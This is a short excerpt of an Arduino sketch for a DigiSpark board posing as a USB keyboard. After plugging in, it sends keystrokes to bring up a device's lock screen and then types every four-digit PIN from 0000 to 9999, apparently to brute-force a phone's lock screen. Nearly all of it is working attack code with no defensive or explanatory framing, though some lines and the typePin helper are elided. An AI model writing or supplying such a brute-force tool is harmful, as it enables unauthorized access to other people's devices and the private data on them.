...
void setup() {
  ...
  DigiKeyboard.delay(1000); // Initial delay after plug-in

  // Optional: reset to home screen and swipe up before starting
  DigiKeyboard.sendKeyStroke(KEY_BACKSPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_UP);
  DigiKeyboard.delay(2000);

  // Start brute-force from 0000 to 9999
  char pin[5]; // 4 digits + null terminator
  for (int i = 0; i <= 9999; i++) {
    sprintf(pin, "%04d", i); // Format as 4-digit string with leading zeros
    typePin(pin);
  }
}
